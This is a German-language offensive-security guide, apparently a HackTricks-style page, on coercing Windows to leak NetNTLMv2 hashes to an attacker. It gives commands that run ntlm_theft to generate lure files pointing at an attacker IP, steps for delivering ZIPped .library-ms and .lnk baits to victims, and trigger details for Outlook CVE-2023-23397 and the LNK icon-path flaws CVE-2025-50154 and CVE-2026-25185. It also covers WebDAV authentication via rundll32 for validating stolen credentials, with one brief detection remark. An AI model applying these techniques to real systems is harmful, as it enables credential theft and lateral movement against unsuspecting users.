...
**Prüfe alle großartigen Ideen unter [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) – vom Download einer Microsoft-Word-Datei aus dem Internet bis zur Quelle für ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md sowie [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Beschreibbarer SMB share + durch Explorer ausgelöste UNC-Köder (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **in einen share schreiben kannst, den Benutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deinen UNC-Pfad verweisen (z. B. `\\ATTACKER\share`). Beim Anzeigen des Ordners wird eine **implizite SMB-Authentifizierung** ausgelöst und ein **NetNTLMv2** an deinen Listener geleakt.<sup>[[1]](#references)</sup>

1. **Köder generieren** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/usw. ab)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Auf dem beschreibbaren Share ablegen** (beliebiger Ordner, den das Opfer öffnet):
```bash
...
```
Betriebsschritte
- Erstelle die .library-ms-Datei mit dem obigen XML (setze deine IP/den Hostnamen).
- Komprimiere sie (unter Windows: Senden an → ZIP-komprimierter Ordner) und übermittle die ZIP-Datei an das Ziel.
- Starte einen NTLM capture listener und warte, bis das Opfer die .library-ms-Datei aus dem ZIP öffnet.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in calendar items. Wenn diese Eigenschaft auf einen UNC-Pfad zeigte (z. B. \\attacker\share\alert.wav), kontaktierte Outlook die SMB-Freigabe, sobald die Erinnerung ausgelöst wurde, und legte das Net‑NTLMv2 des Benutzers ohne jeglichen Klick offen. Dies wurde am 14. März 2023 gepatcht, ist aber für legacy/ungepatchte Umgebungen und die historische incident response weiterhin äußerst relevant.<sup>[[5]](#references)</sup>
...
```
Hinweise
- Ein Opfer muss nur Outlook für Windows ausgeführt haben, wenn die Erinnerung ausgelöst wird.
...
Windows Explorer rendert Verknüpfungssymbole automatisch. Neuere Untersuchungen zeigten, dass selbst nach Microsofts Patch vom April 2025 für UNC-Icon-Verknüpfungen weiterhin eine NTLM-Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Verknüpfungsziel auf einem UNC-Pfad gehostet und das Icon lokal belassen wurde (der Patch-Bypass erhielt die Bezeichnung CVE‑2025‑50154). Bereits das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote-Ziel abzurufen, wodurch NTLM an den SMB-Server des Angreifers gesendet wird.<sup>[[6]](#references)</sup>
...
IconIndex=0
```
Payload einer Programmverknüpfung (.lnk) über PowerShell:
```powershell
...
```
Delivery-Ideen
- Den Shortcut in ein ZIP legen und das Opfer dazu bringen, darin zu browsen.
- Den Shortcut auf einer beschreibbaren Freigabe ablegen, die das Opfer öffnen wird.
- Mit anderen Lure-Dateien im selben Ordner kombinieren, sodass Explorer eine Vorschau der Elemente anzeigt.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten während der **Ansicht/Vorschau** (Icon-Rendering), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke dazu führen, dass die Shell während des **Ladevorgangs** einen Icon-Pfad auflöst und auf das Dateisystem zugreift, wodurch ausgehendes NTLM gesendet wird, wenn der Pfad remote ist.

Wichtige Trigger-Bedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einschließen (Gate zur Icon-Update-Routine).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einschließen.
- Der Loader expandiert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wenn `TargetUnicode` zu einem UNC-Pfad aufgelöst wird (z. B. `\\attacker\share\icon.ico`), führt bereits das Anzeigen eines Ordners, der den Shortcut enthält, zu ausgehender Authentifizierung. Derselbe Ladepfad kann auch durch **Indexierung** und **AV-Scanning** ausgelöst werden, wodurch eine praktische No-click-Leak-Oberfläche entsteht.<sup>[[7]](#references)</sup>

Research-Tools (Parser/Generator/UI) sind im **LnkMeMaybe**-Projekt verfügbar, um diese Strukturen zu erstellen und zu untersuchen, ohne die Windows-GUI zu verwenden.<sup>[[8]](#references)</sup>
...
- Gegen einen **von einem Angreifer kontrollierten WebDAV-Server** kann damit **NTLM über HTTP** ausgelöst werden, ohne einen eigenen Client abzulegen.
- Gegen **interne Hosts** ist dies eine unauffällige Möglichkeit zu **überprüfen, wo gestohlene Anmeldedaten akzeptiert werden**, bevor eine laterale Bewegung erfolgt.<sup>[[9]](#references)</sup>
- Der Befehl ist eine gute Alternative, wenn der **SMB-Egress** gefiltert wird, **HTTP/WebDAV** jedoch weiterhin erreichbar ist.

Betriebshinweise:
- Der **WebClient**-Dienst muss auf dem Quellhost ausgeführt werden.
- `rundll32.exe` lädt `davclnt.dll` und veranlasst Windows, die WebDAV-Authentifizierung mit den **Anmeldedaten des aktuellen Benutzers** durchzuführen.<sup>[[10]](#references)</sup>
...
```
Aus Sicht der Detection sind wiederholte Ausführungen von `rundll32.exe davclnt.dll,DavSetCookie` gegen viele interne Systeme ein starkes Signal für **Credential Validation / spray-artige Vorbereitung lateraler Bewegungen** und nicht für normales Benutzerverhalten.<sup>[[9]](#references)[[11]](#references)</sup>
...
```
3) Neu als .docx packen und bereitstellen. Starte deinen SMB capture listener und warte, bis die Datei geöffnet wird.

Ideen für die Zeit nach dem Capture zum Relaying oder Missbrauch von NTLM findest du hier:
